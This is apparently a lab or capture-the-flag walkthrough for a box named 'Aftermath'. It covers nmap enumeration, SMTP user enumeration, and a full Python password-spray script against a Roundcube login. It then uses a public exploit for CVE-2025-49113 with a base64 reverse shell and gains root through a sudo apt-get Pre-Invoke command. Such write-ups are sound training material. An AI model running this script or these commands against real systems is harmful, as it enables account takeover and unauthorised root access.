# Aftermath

## Enumeration&#x20;

In the lab, we have already been provided with names.txt and passwords.txt file&#x20;

### Nmap scan&#x20;

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a4:f0:03:80:46:18:04:53:47:2e:bf:8d:c1:9e:66:26 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMgbbaMyJEYXgh7IT0kwHZ4vF+bNfXi/Qo6kzc+wldKmAOfdHNrt5kZd5lG51lsL975V0F4R7RVzHDVFJEZeWQk=
|   256 ed:38:36:53:81:bf:c3:15:a2:22:d8:cc:49:3c:63:3d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPxf4Ttxig7FRpqQuFy9yStc+ajfdz52dxXC3rUwH2dL
25/tcp open  smtp    syn-ack ttl 62 Postfix smtpd
|_smtp-commands: kali, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| ssl-cert: Subject: commonName=kali
| Subject Alternative Name: DNS:kali
| Issuer: commonName=kali
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-02T19:39:52
| Not valid after:  2036-02-28T19:39:52
| MD5:     25b2 9a20 c5a5 6087 df8f 476e b232 39c9
| SHA-1:   3452 1e8f 0af2 ce28 ca99 2a19 2dee 54dc b5aa a673
| SHA-256: 29b8 8b02 a633 cfb9 7523 0e9d 7d94 9b9f 9711 499e efcb 6c58 7a00 b6a8 35d1 1498
| -----BEGIN CERTIFICATE-----
| MIIC6TCCAdGgAwIBAgIUeaW7QnviaqxGa5HvkjnVU+GhQ9IwDQYJKoZIhvcNAQEL
| BQAwDzENMAsGA1UEAwwEa2FsaTAeFw0yNjAzMDIxOTM5NTJaFw0zNjAyMjgxOTM5
| NTJaMA8xDTALBgNVBAMMBGthbGkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
| AoIBAQCrVQbb6jV/ft5z1U6pFdKJutmgAX1YJeASr5z0ilBFDiRSTgugKAvcmyCt
| uzE0RY6Gzd4xwuZvh3ltmoXKBq11WnD2U5pYQENaPEPeJ7oFfT9+Uad780rXrmR7
| fhNtpDrZjSoshA06uF4xDgI5p2HcWCD5hINmfqbjzq1OBEtW8G3MvZd/snmGOn2v
| QpZ9uj1tUyRT55VvRohdDS+K7szLcrs9iRpqog77+N4aIC8tCZxi1h2oar+GHJR+
| r6N3J85XVyOUzZPPcRdNBtbUuGEedQxGrDY4ZAuSKawWJVOG+1V3uBA1bRAjdJJl
| w6aUpoxkuAAiwkdaSXmzRggkYMKLAgMBAAGjPTA7MAkGA1UdEwQCMAAwDwYDVR0R
| BAgwBoIEa2FsaTAdBgNVHQ4EFgQUBhinmATeQCMbrSPjOEO54MeSTwQwDQYJKoZI
| hvcNAQELBQADggEBAJ+zdoifzuC1RIQGsY3xvQVRzS4FwTQ4IHiyfULomrTVCNoB
| +Lwc0OjBGRZqPdMo/Defbb7x/eSV4X2WXC3b15jhpkY++Y7BXq6In3SKpiAPySCW
| k1bYokHYNb19xjLEZPEjeXGB2zm+ikjOZ2pAufdIfqFFU1vqwlf9b/WEm5g6/p+t
| KZF9k99LMjXo1SYCnlZXiowI6XrEIN2sBZaYcRCeIGa1pHgBxc+WQ2S5Xiy8JPtQ
| cFAFpi/I0cnLsYsF8C0CG5xCWRddbpz6pX0vdujUvF5KGTyCycTPEWtVFbrWi4I3
| bapnWexZWBnOeKdfmSWNgFSQ+/AXhp0vD+SjUqg=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Home
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
```



### Port 80 - HTTP

Directory fuzzing revealed the /roundcube directory, which I attempted to intercept using Burp Suite to identify accepted parameters, but this method did not work.

<figure><img src="../.gitbook/assets/image (288).png" alt=""><figcaption></figcaption></figure>



### Port 25 - SMTP&#x20;

User enumeration with names.txt file, and found user maria and kali exists

<figure><img src="../.gitbook/assets/image (287).png" alt=""><figcaption></figcaption></figure>

#### Roundcube password spray tool -&#x20;

[https://github.com/robotshell/cubeSpraying](https://github.com/robotshell/cubeSpraying)

Had issues with password spray tool, so modified the script a bit and made a custom one that performs a fresh GET before each POST, extracting a live token per attempt

```
import requests
import time

url = "http://10.1.5.211/roundcube/?_task=login"
passwords = open("passwords.txt").read().splitlines()

for pwd in passwords:
    for attempt in range(3):
        try:
            s = requests.Session()
            r = s.get(url, timeout=15)
            token = r.text.split('name="_token" value="')[1].split('"')[0]
            data = {
                "_token": token,
                "_task": "login",
                "_action": "login",
                "_timezone": "America/New_York",
                "_url": "_task=login",
                "_user": "maria",
                "_pass": pwd
            }
            resp = s.post(url, data=data, allow_redirects=False, timeout=15)
            if resp.status_code in (302, 303):
                print(f"\n[+] SUCCESS: maria:{pwd}\n")
                exit()
            else:
                print(f"[-] Failed: maria:{pwd}")
            break
        except requests.exceptions.Timeout:
            print(f"[!] Timeout maria:{pwd} retry {attempt+1}/3")
            time.sleep(2)
        except Exception as e:
            print(f"[!] Error -> {e}")
            break
```

Found maria password and able to autheticated on port 80 /roundcube and read the inital flag&#x20;

<figure><img src="../.gitbook/assets/image (289).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (290).png" alt=""><figcaption></figcaption></figure>



Found the version of roundcube in about, and this particular version is vulnerable to remote code execution by authenticated users because the \_from parameter in a URL is not validated in program/actions/settings/upload.php, leading to PHP Object Deserialization

<figure><img src="../.gitbook/assets/image (291).png" alt=""><figcaption></figcaption></figure>

#### CVE - [https://nvd.nist.gov/vuln/detail/cve-2025-49113](https://nvd.nist.gov/vuln/detail/cve-2025-49113)



### PoC exploit for roundcube v1.5.9&#x20;

[https://github.com/fearsoff-org/CVE-2025-49113](https://github.com/fearsoff-org/CVE-2025-49113)



Clone the repo and run the script by encoding bash reverse shell payload to base64 and decoding it in order to obtain full terminal shell access as user www-data&#x20;

<figure><img src="../.gitbook/assets/image (293).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (294).png" alt=""><figcaption></figcaption></figure>



Able to switch to maria with su

<figure><img src="../.gitbook/assets/image (296).png" alt=""><figcaption></figcaption></figure>

user flag was located in /usr instead of maria home directory&#x20;

<figure><img src="../.gitbook/assets/image (297).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation

user maria do not have any misconfigurations to escalate to root, but running sudo -l revealed that the www-data user can execute /usr/bin/apt-get as root without a password. I exploited this misconfiguration via GTFOBins by passing a malicious hook option (-o APT::Update::Pre-Invoke::=/bin/sh) during an apt-get update command, spawning a root shell and allowing me to retrieve the root flag from /root/root.txt.



```
Command:- sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

<figure><img src="../.gitbook/assets/image (298).png" alt=""><figcaption></figcaption></figure>









